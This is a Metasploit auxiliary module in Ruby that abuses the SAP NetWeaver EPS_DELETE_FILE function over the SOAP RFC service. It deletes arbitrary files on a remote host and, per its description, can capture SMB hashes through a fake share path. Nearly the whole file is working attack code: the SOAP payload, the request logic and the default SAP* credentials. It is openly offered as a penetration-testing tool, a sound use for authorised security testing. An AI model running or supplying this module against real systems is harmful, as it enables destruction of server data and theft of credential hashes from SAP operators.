##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP SOAP EPS_DELETE_FILE File Deletion',
			'Description' => %q{
					This module abuses the SAP NetWeaver EPS_DELETE_FILE function, on the SAP SOAP
				RFC Service, to delete arbitrary files on the remote file system. The module can
				also be used to capture SMB hashes by using a fake SMB share as DIRNAME.
			},
			'References' => [
				[ 'OSVDB', '74780' ],
				[ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=331' ],
				[ 'URL', 'https://service.sap.com/sap/support/notes/1554030' ]
			],
			'Author' =>
				[
					'Alexey Sintsov', # Vulnerability discovery
					'nmonkee' # Metasploit module
				],
			'License' => MSF_LICENSE
			)

		register_options([
			Opt::RPORT(8000),
			OptString.new('CLIENT', [true, 'SAP Client', '001']),
			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
			OptString.new('PASSWORD', [true, 'Password', '06071992']),
			OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),
			OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])
		], self.class)
	end

	def run_host(ip)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
		data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
		data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<SOAP-ENV:Header/>'
		data << '<SOAP-ENV:Body>'
		data << '<EPS_DELETE_FILE xmlns="urn:sap-com:document:sap:rfc:functions">'
		data << '<DIR_NAME>' + datastore['DIRNAME'] + '</DIR_NAME>'
		data << '<FILE_NAME>' + datastore['FILENAME'] + '</FILE_NAME>'
		data << '<IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>'
		data << '<IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>'
		data << '</EPS_DELETE_FILE>'
		data << '</SOAP-ENV:Body>'
		data << '</SOAP-ENV:Envelope>'

		begin
			vprint_status("#{rhost}:#{rport} - Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}")
			res = send_request_cgi({
				'uri' => '/sap/bc/soap/rfc',
				'method' => 'POST',
				'data' => data,
				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
				'ctype' => 'text/xml; charset=UTF-8',
				'headers' => {
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
				},
				'vars_get' => {
					'sap-client' => datastore['CLIENT'],
					'sap-language' => 'EN'
				}
			})

			if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body.include?(datastore['FILENAME']) and res.body.include?(datastore['DIRNAME'])
				print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
			elsif res
				vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
				vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
				vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
			end
			rescue ::Rex::ConnectionError
				print_error("#{rhost}:#{rport} - Unable to connect")
				return
			end
		end
	end
